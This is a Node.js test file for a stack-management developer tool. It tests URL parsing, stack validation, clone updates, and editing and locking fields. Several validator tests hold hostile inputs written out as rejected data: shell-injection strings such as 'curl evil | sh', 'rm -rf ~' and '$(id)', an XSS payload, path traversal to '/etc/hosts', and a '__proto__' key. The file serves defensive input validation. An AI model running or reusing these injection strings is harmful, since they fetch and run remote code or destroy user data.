import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
let app, branchList, found, hostOwners, missingCalls, remoteKey, repos, slugMatches, stack, validateStack;
test('Its own folders, set before the sync module loads: these tests switch stacks, which moves the run files of the stack in use.', async () => {
  const sandbox = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-switch-'));
  process.env.KOPPLER_TEMP = path.join(sandbox, 'temp'); process.env.KOPPLER_CONFIG_DIR = path.join(sandbox, 'config');
  fs.mkdirSync(process.env.KOPPLER_TEMP); fs.mkdirSync(process.env.KOPPLER_CONFIG_DIR);
  ({ branchList, remoteKey, slugMatches } = await import('../dist/engine/repos.js'));
  ({ hostOwners, missingCalls } = await import('../dist/engine/calls.js'));
  ({ validateStack } = await import('../dist/core/stack.js'));

  assert.equal(remoteKey('git@github.com:acme/orders-api.git'), 'github.com/acme/orders-api');
  assert.equal(remoteKey('https://github.com/Acme/Orders-API/'), 'github.com/acme/orders-api');
});

test('A stray % in an address is no reason to stop reading the other repos.', async () => {
  assert.equal(remoteKey('https://git.acme.dev/team/100%-done.git'), 'git.acme.dev/team/100%-done');
  assert.equal(remoteKey('ssh://git@github.com/acme/x.y'), 'github.com/acme/x.y');
  assert.equal(remoteKey('https://user@gitlab.com/group/sub/repo.git'), 'gitlab.com/group/sub/repo');
  assert.equal(remoteKey('ssh://git@git.acme.dev:2222/team/app.git'), 'git.acme.dev/team/app');
  assert.equal(remoteKey('git@bitbucket.org:acme/app.git'), 'bitbucket.org/acme/app');
  assert.equal(remoteKey('https://dev.azure.com/acme/Shop/_git/orders'), 'dev.azure.com/acme/shop/orders');
  assert.equal(remoteKey('git@ssh.dev.azure.com:v3/acme/Shop/orders'), 'dev.azure.com/acme/shop/orders');
  assert.equal(remoteKey('https://acme.visualstudio.com/Shop/_git/orders'), 'dev.azure.com/acme/shop/orders');
  assert.equal(remoteKey('/Users/me/repos/local-only'), null);
  assert.equal(remoteKey('file:///tmp/x.git'), null);
  assert.equal(remoteKey(undefined), null);

  assert.ok(slugMatches('Acme/orders-api', 'github.com/acme/orders-api'));
  assert.ok(slugMatches('gitlab.com/group/sub/repo', 'gitlab.com/group/sub/repo'));
  assert.ok(!slugMatches('gitlab.com/group/sub/repo', 'github.com/group/sub/repo'));
  assert.ok(!slugMatches('acme/orders', 'github.com/acme/orders-api'));
  assert.ok(!slugMatches('acme/orders', 'gitlab.com/other/acme/orders'));

  app = { name: 'Orders API', kind: 'dotnet', slug: 'acme/orders-api' };
  assert.deepEqual(validateStack({ envs: ['qa'], apps: { orders: app, web: { ...app, consumes: { orders: {} } } } }), []);
  assert.ok(validateStack({ envs: [], apps: {} }).some(e => e.startsWith('envs')));
  assert.ok(validateStack({ envs: ['QA'], apps: {} }).some(e => e.startsWith('envs')));
  assert.ok(validateStack({ envs: ['qa'], apps: { orders: { name: 'x' } } }).some(e => e === 'apps.orders.kind: required'));
  assert.ok(validateStack({ envs: ['qa'], apps: { web: { ...app, consumes: { ghost: {} } } } }).some(e => e.includes('consumes.ghost')));
});

test('Queues: named and typed, and apps only publish to or read queues the stack lists.', async () => {
  assert.deepEqual(validateStack({ envs: ['qa'], queues: { thumbs: { name: 'Thumbnails', type: 'sqs' } }, apps: { orders: { ...app, publishes: { thumbs: {} } }, web: { ...app, reads: { thumbs: { env: ['Q'] } } } } }), []);
  assert.deepEqual(validateStack({ envs: ['qa'], queues: { thumbs: { name: 'T', type: 'rabbit' } }, apps: { web: { ...app, reads: { ghost: {} } } } }), ['queues.thumbs.type: one of sqs, sns, eventbridge, kafka, other', 'apps.web.reads.ghost: no such queue under "queues"']);
  assert.deepEqual(branchList('refs/heads/develop\nrefs/remotes/origin/HEAD\nrefs/remotes/origin/develop\nrefs/remotes/upstream/feature/a\nrefs/heads/fix/b\n'), ['develop', 'feature/a', 'fix/b']);
  assert.deepEqual(branchList(''), []);
  stack = { envs: ['qa'], apps: {
    web: { name: 'Web', kind: 'node', slug: 'a/web', consumes: { orders: { deployed: 'https://orders.qa.acme.dev' } } },
    orders: { name: 'Orders', kind: 'dotnet', slug: 'a/orders', deployedUrl: 'https://orders.qa.acme.dev' },
    pay: { name: 'Pay', kind: 'dotnet', slug: 'a/pay', deployedUrl: 'https://pay.qa.acme.dev' },
    legacy: { name: 'Legacy', kind: 'dotnet', slug: 'a/legacy', deployedUrl: 'https://pay.qa.acme.dev' },
  } };
  assert.deepEqual(hostOwners(stack).shared, [['pay.qa.acme.dev', ['pay', 'legacy']]]);
  repos = { web: ['src/a.ts:1: fetch("https://orders.qa.acme.dev/x")'], orders: ['appsettings.json:3: "PayUrl": "https://pay.qa.acme.dev"', 'cfg.json:9: "Web": "https://ORDERS.QA.ACME.DEV"'], pay: ['a.cs:2: new Uri("https://orders.qa.acme.dev")'] };
  found = missingCalls(stack, id => repos[id] ?? []);
  assert.deepEqual(Object.keys(found), ['pay']);
  assert.deepEqual(Object.keys(found.pay), ['orders']);
  assert.deepEqual(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'Just orders', version: 1, nodes: { orders: {} } }] }), []);
  assert.deepEqual(validateStack({ envs: ['qa', 'prod'], apps: { orders: { ...app, secrets: [{ env: 'DB', type: 'postgres' }], envs: { prod: { secrets: [{ env: 'DB', type: 'oracle' }] } } } } }), ['apps.orders.envs.prod.secrets: type "oracle" is not one Koppler tests (postgres, mysql, redis)']);
  assert.deepEqual(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'No version', nodes: { orders: {} } }] }), ['presets[0].version: required (the current preset format is 1)']);
  assert.match(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'Future', version: 99, nodes: { orders: {} } }] })[0], /newer than this Koppler reads/);
  assert.ok(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'Bad', version: 1, nodes: { ghost: {} }, edges: [{ from: 'orders', to: 'ghost' }] }] }).length === 2);
});

test('Shapes that would crash a later step are refused here, each with a reason, and never by throwing.', async () => {
  {
    const stack = extra => ({ envs: ['qa', 'prod'], apps: { orders: app, web: { ...app } }, ...extra }), web = extra => stack({ apps: { orders: app, web: { ...app, ...extra } } });
    for (const [bad, reason] of [
      [web({ consumes: { orders: null } }), /apps\.web\.consumes\.orders/],
      [web({ consumes: { constructor: {} } }), /consumes\.constructor: no such app/],
      [web({ consumes: [] }), /apps\.web\.consumes/],
      [web({ envs: { prod: null } }), /apps\.web\.envs\.prod/],
      [web({ envs: { staging: {} } }), /apps\.web\.envs\.staging: not one of envs/],
      [web({ envs: [] }), /apps\.web\.envs/],
      [web({ kind: 'constructor' }), /kind: "constructor" is not a kind/],
      [web({ publishes: { constructor: {} } }), /publishes\.constructor: no such queue/],
      [web({ prereqs: {} }), /apps\.web\.prereqs: a list/],
      [web({ secrets: 'DB' }), /apps\.web\.secrets: a list/],
      [stack({ apps: { orders: app, web: null } }), /apps\.web/],
      [stack({ envs: ['qa', 'qa'] }), /envs: .*each once/],
      [stack({ presets: {} }), /presets: a list/],
      [stack({ presets: [null] }), /presets\[0\]/],
      [stack({ presets: [{ name: 'P', version: 1, nodes: { orders: null } }] }), /presets\[0\]\.nodes\.orders/],
      [stack({ presets: [{ name: 'P', version: 1, nodes: [] }] }), /presets\[0\]\.nodes/],
      [stack({ presets: [{ name: 'P', version: 1, nodes: { orders: {} }, edges: { from: 'orders', to: 'web' } }] }), /presets\[0\]\.edges: a list/],
      [stack({ presets: [{ name: 'P', version: 1, nodes: { orders: {} }, edges: [null] }] }), /presets\[0\]\.edges/],
      [stack({ presets: [{ name: 'P', version: 1, nodes: { constructor: {} } }] }), /nodes\.constructor: no such app/],
      [stack({ queues: [] }), /queues: an object/],
      [stack({ kinds: null }), /kinds: an object/],
    ]) {
      let errors; assert.doesNotThrow(() => { errors = validateStack(bad); }, JSON.stringify(bad));
      assert.match(errors.join('\n'), reason, JSON.stringify(bad));
    }
    assert.deepEqual(validateStack(web({ consumes: { orders: {} }, envs: { prod: { start: 'run' } } })), []);
  }
  console.log('ok');
});

test('The picker\'s candidates and adding the picked ones: only clones from the index, never one already in the stack.', async () => {
  const { addApps } = await import('../dist/engine/stack-file.js');
  const { candidateRepos, nameFromRepo } = await import('../dist/engine/repos.js');
  const fsx = await import('node:fs'), osx = await import('node:os'), px = await import('node:path');
  assert.equal(nameFromRepo('acme-wallet-api'), 'Acme Wallet API');
  const dir = fsx.mkdtempSync(px.join(osx.tmpdir(), 'koppler-pick-'));
  const mk = (name, files) => { const d = px.join(dir, 'repos', name); fsx.mkdirSync(d, { recursive: true }); for (const f of files) fsx.writeFileSync(px.join(d, f), '{}'); return d; };
  const index = { roots: [dir], repos: [
    { path: mk('orders-api', ['Orders.csproj']), keys: ['github.com/acme/orders-api'] },
    { path: mk('shop-app', ['pubspec.yaml']), keys: ['github.com/acme/shop-app'] },
    { path: mk('docs', []), keys: ['gitlab.com/acme/team/docs'] },
    { path: px.join(dir, 'gone'), keys: ['github.com/acme/gone'] },
  ] };
  const stackDir = px.join(dir, 'stack'); fsx.mkdirSync(stackDir);
  fsx.writeFileSync(px.join(stackDir, 'stack.json'), JSON.stringify({ name: 'Shop', envs: ['qa'], apps: { 'orders-api': { name: 'Orders', kind: 'dotnet', slug: 'acme/orders-api' } } }));
  const stack = () => JSON.parse(fsx.readFileSync(px.join(stackDir, 'stack.json'), 'utf8'));
  assert.deepEqual(candidateRepos(index, stack(), stackDir).map(c => [c.slug, c.kind, c.inStack ?? null]), [['gitlab.com/acme/team/docs', null, null], ['acme/orders-api', 'dotnet', 'orders-api'], ['acme/shop-app', 'flutter', null]]);
  const opts = { config: { stack: stackDir }, index };
  assert.deepEqual(addApps([{ slug: 'acme/orders-api' }, { slug: 'evil/not-scanned', name: 'x', kind: 'node' }], opts), { added: [] });
  assert.match(addApps([{ slug: 'gitlab.com/acme/team/docs' }], opts).error, /Say what kind of app/);
  assert.deepEqual(addApps([{ slug: 'acme/shop-app', name: '  Shop App  ' }, { slug: 'gitlab.com/acme/team/docs', kind: 'web' }], opts), { added: ['shop-app', 'docs'] });
  assert.deepEqual(stack().apps['shop-app'], { name: 'Shop App', kind: 'flutter', slug: 'acme/shop-app', pending: 'Run facts not collected yet: read the repo (launchSettings/README/infra) and fill run, url, prereqs before using.' });
  assert.equal(stack().apps.docs.kind, 'web');
  assert.deepEqual(validateStack(stack()), []);
  fsx.rmSync(dir, { recursive: true });
});

test('A new stack: a name and environments, created empty in the user\'s private config and made the stack in use.', async () => {
  const { createStack } = await import('../dist/engine/stacks.js');
  const fsx = await import('node:fs'), osx = await import('node:os'), px = await import('node:path');
  const dir = fsx.mkdtempSync(px.join(osx.tmpdir(), 'koppler-new-')), config = {};
  for (const [bad, why] of [[{ name: ' ', envs: 'qa' }, /Give the stack a name/], [{ name: 'X', envs: '' }, /at least one environment/], [{ name: 'X', envs: 'QA!, prod' }, /lowercase letters/]]) assert.match(createStack(bad, { config: {}, dir, save() {} }).error, why);
  const made = createStack({ name: '  Orders Platform ', envs: 'QA, prod  qa' }, { config, dir, save() {} });
  assert.equal(made.stack, px.join(dir, 'orders-platform'));
  assert.deepEqual(JSON.parse(fsx.readFileSync(px.join(made.stack, 'stack.json'), 'utf8')), { name: 'Orders Platform', envs: ['qa', 'prod'], apps: {} });
  assert.deepEqual(validateStack(JSON.parse(fsx.readFileSync(px.join(made.stack, 'stack.json'), 'utf8'))), []);
  assert.equal(config.stack, made.stack);
  assert.match(createStack({ name: 'orders platform', envs: ['qa'] }, { config: {}, dir, save() {} }).error, /already have a stack called/);
  fsx.rmSync(dir, { recursive: true });
});

test('Stacks already on the Mac can be used from the empty state; a folder Koppler did not find cannot.', async () => {
  const { knownStacks, useStack } = await import('../dist/engine/stacks.js');
  const fsx = await import('node:fs'), osx = await import('node:os'), px = await import('node:path');
  const dir = fsx.mkdtempSync(px.join(osx.tmpdir(), 'koppler-use-')), repo = px.join(dir, 'team-repo'), shared = px.join(repo, 'stacks', 'shop');
  fsx.mkdirSync(shared, { recursive: true });
  fsx.writeFileSync(px.join(shared, 'stack.json'), JSON.stringify({ name: 'Shop', envs: ['qa', 'prod'], apps: { api: { name: 'API', kind: 'node', slug: 'acme/api' } } }));
  fsx.mkdirSync(px.join(repo, 'stacks', 'broken')); fsx.writeFileSync(px.join(repo, 'stacks', 'broken', 'stack.json'), '{"apps": []}');
  const index = { repos: [{ path: repo, keys: ['github.com/acme/team-repo'] }] }, config = {};
  const found = knownStacks(index).filter(s => s.dir.startsWith(dir));
  assert.deepEqual(found.map(s => [s.name, s.apps, s.envs.join(), s.shared]), [['Shop', 1, 'qa,prod', true]]);
  assert.match(useStack('/etc', { config, index, save() {} }).error, /not a stack Koppler found/);
  assert.deepEqual(useStack(shared, { config, index, save() {} }), { stack: shared });
  assert.equal(config.stack, shared);
  fsx.rmSync(dir, { recursive: true });
});

test('Switching stacks puts one stack\'s board, history and log away and brings the other\'s back.', async () => {
  const { setStack, stackKey } = await import('../dist/engine/stacks.js');
  const fsx = await import('node:fs'), px = await import('node:path');
  const temp = process.env.KOPPLER_TEMP;
  if (temp && temp.includes('koppler-switch-')) {
    const config = { stack: '/stacks/a' };
    fsx.writeFileSync(px.join(temp, 'state.json'), 'board A'); fsx.writeFileSync(px.join(temp, 'history.jsonl'), 'history A'); fsx.writeFileSync(px.join(temp, 'registry.json'), 'shared');
    setStack(config, '/stacks/b', () => {});
    assert.equal(config.stack, '/stacks/b');
    assert.equal(fsx.existsSync(px.join(temp, 'state.json')), false);
    assert.equal(fsx.readFileSync(px.join(temp, 'stacks', stackKey('/stacks/a'), 'state.json'), 'utf8'), 'board A');
    assert.equal(fsx.readFileSync(px.join(temp, 'registry.json'), 'utf8'), 'shared');
    fsx.writeFileSync(px.join(temp, 'state.json'), 'board B');
    setStack(config, '/stacks/a', () => {});
    assert.deepEqual([fsx.readFileSync(px.join(temp, 'state.json'), 'utf8'), fsx.readFileSync(px.join(temp, 'history.jsonl'), 'utf8')], ['board A', 'history A']);
    setStack(config, '/stacks/a', () => {});
    assert.equal(fsx.readFileSync(px.join(temp, 'state.json'), 'utf8'), 'board A');
  }
});

test('A remembered change must name a file inside the app\'s clone.', async () => {
  const base = { envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a' } } };
  const withChange = file => ({ ...base, apps: { a: { ...base.apps.a, localChanges: [{ file, find: 'x', replace: 'y' }] } } });
  assert.deepEqual(validateStack(withChange('src/a.js')), []);
  for (const bad of ['../x', '/etc/hosts', 'a/../../x']) assert.match(validateStack(withChange(bad)).join(), /localChanges\[0\]/, bad);
});

test('A tunnel\'s port must be a number: it reaches the page, shell commands and the port probe.', async () => {
  const st = port => ({ envs: ['qa', 'prod'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a', prereqs: [{ tunnel: 'db.acme.dev', port }], envs: { prod: { prereqs: [{ tunnel: 'db.acme.dev', port }] } } } } });
  assert.deepEqual(validateStack(st(5432)), []);
  assert.equal(validateStack(st('5432"><img src=x onerror=alert(1)>')).length, 2);
  assert.match(validateStack(st(70000)).join(), /prereqs\[0\]\.port/);
});

test('Values that end up in commands must look like what they are.', async () => {
  const st = (prereq, extra = {}) => ({ envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a', prereqs: [prereq], ...extra } } });
  assert.deepEqual(validateStack(st({ tunnel: 'db.acme.dev', port: 5432, connectsAs: 'db-1.internal', env: 'ConnectionStrings__Db' })), []);
  assert.deepEqual(validateStack(st({ sso: 'acme-qa' })), []);
  for (const [bad, field] of [[{ tunnel: 'db.acme.dev; touch /tmp/x #' }, 'tunnel'], [{ connectsAs: 'x" && rm -rf ~' }, 'connectsAs'], [{ hosts: 'a b' }, 'hosts'], [{ sso: 'qa; curl x' }, 'sso'], [{ env: 'A=$(id)' }, 'env']])
    assert.match(validateStack(st(bad)).join(), new RegExp(`prereqs\\[0\\]\\.${field}`), field);
  assert.match(validateStack(st({}, { slug: 'acme/a.git; curl evil | sh #' })).join(), /slug/);
  assert.match(validateStack(st({}, { secrets: [{ env: 'DB URL' }] })).join(), /secrets\[0\]\.env/);
  assert.match(validateStack({ ...st({}), queues: { q: { name: 'Q', type: 'sqs', queue: 'x; rm' } } }).join(), /queues\.q\.queue/);
});

test('What gets approved is what runs: nothing is cut short, so over-long or over-many checks and commands are refused.', async () => {
  const base = { envs: ['qa'], apps: { a: { name: 'A', kind: 'other', slug: 'acme/a', start: 'make run' } } };
  assert.deepEqual(validateStack({ ...base, checks: [{ name: 'vpn', run: 'pgrep -x vpnd' }] }), []);
  assert.match(validateStack({ ...base, checks: [{ name: 'vpn', run: `true ${'#'.repeat(2000)}; curl evil | sh` }] }).join(), /checks\[0\]/);
  assert.match(validateStack({ ...base, checks: Array.from({ length: 51 }, (_, n) => ({ name: `c${n}`, run: 'true' })) }).join(), /at most 50/);
  assert.match(validateStack({ ...base, apps: { a: { ...base.apps.a, start: 'x'.repeat(2001) } } }).join(), /apps\.a\.start/);
});

test('`protected` names environments the stack has.', async () => {
  const st = p => ({ envs: ['qa', 'prod'], protected: p, apps: {} });
  assert.deepEqual(validateStack(st(['prod'])), []);
  assert.match(validateStack(st(['production'])).join(), /protected/);
  assert.match(validateStack(st('prod')).join(), /protected/);
});

test('Updating clones: fetch, then fast-forward only a clean branch that is simply behind.', async () => {
  const { updateAction, updateClones } = await import('../dist/engine/clones.js');
  assert.equal(updateAction({ upstream: null, dirty: 0, ahead: 0, behind: 3 }), 'no-upstream');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 0, ahead: 0, behind: 0 }), 'current');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 0, ahead: 0, behind: 2 }), 'fast-forward');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 1, ahead: 0, behind: 2 }), 'dirty');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 0, ahead: 1, behind: 2 }), 'diverged');

  const { execFileSync: sh } = await import('node:child_process');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-fetch-'));
  const git = (cwd, ...args) => sh('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...args], { cwd, encoding: 'utf8' }).trim();
  const origin = path.join(dir, 'origin'), clean = path.join(dir, 'clean'), dirty = path.join(dir, 'dirty');
  fs.mkdirSync(origin); git(origin, 'init', '-q', '-b', 'main'); fs.writeFileSync(path.join(origin, 'a.txt'), '1'); git(origin, 'add', '.'); git(origin, 'commit', '-qm', 'one');
  git(dir, 'clone', '-q', origin, clean); git(dir, 'clone', '-q', origin, dirty);
  fs.writeFileSync(path.join(origin, 'a.txt'), '2'); git(origin, 'commit', '-qam', 'two');
  fs.writeFileSync(path.join(dirty, 'mine.txt'), 'work in progress');
  fs.writeFileSync(path.join(process.env.KOPPLER_TEMP, 'local.json'), JSON.stringify({ apps: { clean: { path: clean, branch: 'main' }, dirty: { path: dirty, branch: 'main' }, gone: null } }));
  const lines = []; const log = console.log; console.log = l => lines.push(l);
  try { await updateClones(); } finally { console.log = log; }
  assert.equal(fs.readFileSync(path.join(clean, 'a.txt'), 'utf8'), '2', 'a clean clone that is behind is fast-forwarded');
  assert.equal(fs.readFileSync(path.join(dirty, 'a.txt'), 'utf8'), '1', 'a clone with uncommitted work is left alone');
  assert.equal(fs.readFileSync(path.join(dirty, 'mine.txt'), 'utf8'), 'work in progress');
  assert.ok(lines.some(l => /^UPDATED clean: main \+1/.test(l)), lines.join('\n'));
  assert.ok(lines.some(l => /^BEHIND dirty: main is 1 behind .*uncommitted/.test(l)), lines.join('\n'));
  fs.rmSync(dir, { recursive: true, force: true });
});

test('Removing an app: its entry and other apps\' calls to it go; nothing else changes.', async () => {
  const { removeApp } = await import('../dist/engine/stack-file.js');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-remove-'));
  fs.writeFileSync(path.join(dir, 'stack.json'), JSON.stringify({ name: 'S', koppler: '0.2.0', envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'x/a', consumes: { b: { how: 'env' }, c: { how: 'env' } } }, b: { name: 'B', kind: 'node', slug: 'x/b' }, c: { name: 'C', kind: 'node', slug: 'x/c' } }, presets: [{ name: 'P', version: 1, koppler: '0.1.0', nodes: { a: {}, b: {} }, edges: [] }] }));
  assert.deepEqual(removeApp('b', { config: { stack: dir } }), { removed: 'b', name: 'B' });
  const after = JSON.parse(fs.readFileSync(path.join(dir, 'stack.json'), 'utf8'));
  assert.deepEqual(Object.keys(after.apps), ['a', 'c']);
  assert.deepEqual(Object.keys(after.apps.a.consumes), ['c']);
  assert.deepEqual(after.presets[0].nodes, { a: {}, b: {} });
  assert.match(removeApp('zzz', { config: { stack: dir } }).error, /not in the stack/);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('An outside system joins the stack with the apps that call it; what cannot be one is refused and nothing is written.', async () => {
  const { addOutside } = await import('../dist/engine/stack-file.js');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-outside-'));
  const file = path.join(dir, 'stack.json');
  fs.writeFileSync(file, JSON.stringify({ name: 'S', koppler: '0.2.0', envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'x/a', consumes: { b: { how: 'env' } } }, b: { name: 'B', kind: 'node', slug: 'x/b' }, sf: { name: 'Salesforce', kind: 'other', outside: 'SaaS' } } }));
  const opts = { config: { stack: dir } };
  const before = fs.readFileSync(file, 'utf8');
  assert.match(addOutside({ name: ' ' }, opts).error, /Give the outside system a name/);
  assert.match(addOutside({ name: 'Stripe', calledBy: [] }, opts).error, /Say which apps call Stripe, or which it sends to/);
  assert.match(addOutside({ name: 'Stripe', calledBy: ['zzz', 'sf'] }, opts).error, /Not apps of the stack that run here: zzz, sf/);
  assert.match(addOutside({ name: 'Stripe', url: 'ftp://x', calledBy: ['a'] }, opts).error, /not a web address/);
  assert.match(addOutside({ name: 'salesforce', calledBy: ['a'] }, opts).error, /already has salesforce/);
  assert.equal(fs.readFileSync(file, 'utf8'), before);
  assert.deepEqual(addOutside({ name: 'Stripe Payments', url: 'https://api.stripe.com', calledBy: ['a', 'b', 'a'] }, opts), { added: 'stripe-payments' });
  const after = JSON.parse(fs.readFileSync(file, 'utf8'));
  assert.deepEqual(after.apps['stripe-payments'], { name: 'Stripe Payments', kind: 'other', outside: 'An outside system: it never runs here.', deployedUrl: 'https://api.stripe.com' });
  assert.deepEqual(after.apps.a.consumes, { b: { how: 'env' }, 'stripe-payments': {} });
  assert.deepEqual(after.apps.b.consumes, { 'stripe-payments': {} });
  // A webhook: the outside system calls the app.
  assert.deepEqual(addOutside({ name: 'Adyen', sendsTo: ['b'] }, opts), { added: 'adyen' });
  assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')).apps.adyen.consumes, { b: {} });
  fs.rmSync(dir, { recursive: true, force: true });
});

test('Any field of the stack is changed through one checked edit: the value that keeps the stack valid is written, else nothing.', async () => {
  const { editStack, readStackAt } = await import('../dist/engine/stack-file.js');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-edit-'));
  const file = path.join(dir, 'stack.json');
  fs.writeFileSync(file, JSON.stringify({ name: 'S', envs: ['qa', 'prod'], apps: { a: { name: 'A', kind: 'node', slug: 'x/a' } } }));
  const opts = { config: { stack: dir } };
  const read = at => readStackAt(at, opts).value;
  // Typed in a terminal: a port is a number, an AWS account id stays text.
  assert.deepEqual(editStack('apps.a.prereqs[0]', [{ tunnel: 'db.acme.example', port: 5432 }], opts), { path: 'apps.a.prereqs[0]', value: { tunnel: 'db.acme.example', port: 5432 } });
  assert.equal(editStack('apps.a.prereqs[0].port', [JSON.parse('6543'), '6543'], opts).value, 6543);
  assert.equal(editStack('apps.a.prereqs[1]', [{ sso: 'acme-dev' }], opts).error, undefined);
  assert.equal(editStack('apps.a.prereqs[1].account', [JSON.parse('123456789012'), '123456789012'], opts).value, '123456789012');
  assert.deepEqual(read('apps.a.prereqs[1]'), { sso: 'acme-dev', account: '123456789012' });
  assert.equal(editStack('apps.a.envs.prod.start', ['npm run prod'], opts).error, undefined);
  assert.equal(read('apps.a.envs.prod.start'), 'npm run prod');
  // What breaks a rule is refused with the rule, and the file is left as it was.
  const before = fs.readFileSync(file, 'utf8');
  assert.match(editStack('apps.a.kind', [''], opts).error, /apps\.a\.kind: required/);
  assert.match(editStack('apps.a.envs.staging.start', ['x'], opts).error, /not one of envs/);
  assert.match(editStack('apps.a.prereqs[0].port', ['not a port'], opts).error, /a port number/);
  assert.match(editStack('apps.a.prereqs[9]', [{}], opts).error, /no item 9/);
  assert.match(editStack('apps.__proto__.x', ['y'], opts).error, /cannot be part of a path/);
  assert.equal(fs.readFileSync(file, 'utf8'), before);
  // Taken out: a list closes up.
  assert.equal(editStack('apps.a.prereqs[0]', undefined, opts).error, undefined);
  assert.deepEqual(read('apps.a.prereqs'), [{ sso: 'acme-dev', account: '123456789012' }]);
  assert.equal(read('apps.a.nothing'), undefined);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('A locked field is kept as it is by every change, and only the person unlocks it.', async () => {
  const { editStack, removeApp } = await import('../dist/engine/stack-file.js');
  const { setLock } = await import('../dist/engine/locks.js');
  const { spawnSync } = await import('node:child_process');
  const { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-lock-'));
  const was = process.env.KOPPLER_CONFIG_DIR;
  process.env.KOPPLER_CONFIG_DIR = dir;
  const file = path.join(dir, 'stack.json');
  fs.writeFileSync(file, JSON.stringify({ name: 'S', koppler: '0.2.0', envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'x/a', url: 'http://localhost:3000' }, b: { name: 'B', kind: 'node', slug: 'x/b' } } }));
  const opts = { config: { stack: dir } };
  assert.deepEqual(setLock(file, 'apps.a.url', true), {});
  const before = fs.readFileSync(file, 'utf8');
  assert.match(editStack('apps.a.url', ['http://localhost:4000'], opts).error, /apps\.a\.url is locked/);
  assert.match(editStack('apps.a', [{ name: 'A', kind: 'node', slug: 'x/a' }], opts).error, /apps\.a\.url is locked/);
  assert.match(removeApp('a', opts).error, /apps\.a\.url is locked/);
  assert.equal(fs.readFileSync(file, 'utf8'), before);
  // What the lock does not cover still changes.
  assert.equal(editStack('apps.a.name', ['Shop'], opts).error, undefined);
  assert.equal(removeApp('b', opts).error, undefined);
  // An agent or a script cannot unlock: there is no one at a terminal to say yes, and --yes is not taken.
  fs.writeFileSync(path.join(dir, 'config.json'), JSON.stringify({ stack: dir }));
  const entry = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs');
  const unlock = spawnSync('node', [entry, 'stack', 'unlock', 'apps.a.url', '--yes'], { encoding: 'utf8', env: { ...process.env, KOPPLER_CONFIG_DIR: dir } });
  assert.notEqual(unlock.status, 0);
  assert.match(unlock.stdout + unlock.stderr, /stays locked/);
  assert.match(spawnSync('node', [entry, 'stack', 'locks'], { encoding: 'utf8', env: { ...process.env, KOPPLER_CONFIG_DIR: dir } }).stdout, /apps\.a\.url/);
  assert.deepEqual(setLock(file, 'apps.a.url', false), {});
  assert.equal(editStack('apps.a.url', ['http://localhost:4000'], opts).error, undefined);
  if (was === undefined) delete process.env.KOPPLER_CONFIG_DIR;
  else process.env.KOPPLER_CONFIG_DIR = was;
  fs.rmSync(dir, { recursive: true, force: true });
});
